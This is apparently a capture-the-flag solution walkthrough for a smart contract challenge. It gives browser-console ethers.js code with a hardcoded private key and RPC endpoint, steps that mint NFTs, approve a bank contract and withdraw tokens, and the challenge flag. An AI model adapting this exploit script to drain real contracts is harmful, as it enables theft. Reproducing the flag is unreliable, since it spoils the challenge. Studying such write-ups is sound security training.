Step-by-step Exploit Setup
Paste and run this whole block first to reinitialize everything:

```js
(async () => {
  const { ethers } = window;

  const RPC_URL = "http://152.42.220.146:30001/24b17acb-3844-441f-9fe2-2f1a8b5bba42";
  const PRIVKEY = "a7d5dfe57910c2a54332fe84a005e4798c30c07ee3aae20bc661e7eaa36c3933";
  const SETUP_ADDR = "0x52ac3215edF7Cfe1C0292B1457ecfe5af9F88ed9";

  const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVKEY, provider);

  window.setup = new ethers.Contract(SETUP_ADDR, [
    "function sedekah() external returns (uint256)",
    "function nft() view returns (address)",
    "function bank() view returns (address)",
    "function isSolved() view returns (bool)"
  ], wallet);

  const nftAddr = await setup.nft();
  const bankAddr = await setup.bank();

  console.log("NFT Address:", nftAddr);
  console.log("Bank Address:", bankAddr);

  window.nft = new ethers.Contract(nftAddr, [
    "function setApprovalForAll(address operator, bool approved) external",
    "function ownerOf(uint256 tokenId) view returns (address)"
  ], wallet);

  window.bank = new ethers.Contract(bankAddr, [
    "function withdraw(uint256[] calldata) external"
  ], wallet);

  console.log("✅ All contracts initialized. You can now call setup, nft, bank in console.");
})();
```

Once that's run, in your browser console you can now try:
1. Check token ownership
```js
   await nft.ownerOf(0);
   await nft.ownerOf(1);
   ```
2. Mint again
```js
   await (await setup.sedekah()).wait();
   await (await setup.sedekah()).wait();
   ```

3. Approve Bank
```js
   await (await nft.setApprovalForAll(bank.address, true)).wait();
   ```

4. Try withdrawing token(s)
```js
   await (await bank.withdraw([0])).wait();  // or try [1] or both if you own them
   ```

5. Confirm challenge solved
```js
   await setup.isSolved();
```

Prelim{pretty_simple_for_a_start}
